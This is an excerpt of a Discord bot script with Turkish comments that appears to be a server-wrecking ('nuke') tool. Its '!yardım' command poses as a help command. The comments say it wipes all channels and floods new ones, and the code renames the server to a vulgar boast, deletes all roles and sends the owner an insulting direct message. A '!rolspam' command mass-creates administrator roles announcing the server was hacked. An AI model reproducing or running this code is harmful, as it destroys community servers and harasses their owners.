...
client.on("message", async msg => {
  if (msg.content === "!yardım") {     ///COKERT KOMUTU BÜTÜN KANALLARI SILIP COK FAZLA KANAL ACAR
    ...
    await msg.guild.createChannel("patricia", {
      type: "text"
    });
    ...
    await msg.guild.setName("Patricia Tarafından Bu Sunucu Sikilmiştir!"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER) 
    await msg.guild.owner.send("`PATRİCİA` Her Daim Siker!");    //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
  ...
  if (msg.content === "!rolspam") {  //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "Bu Sunucu PATRICIA Tarafından Hacklenmiştir!",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
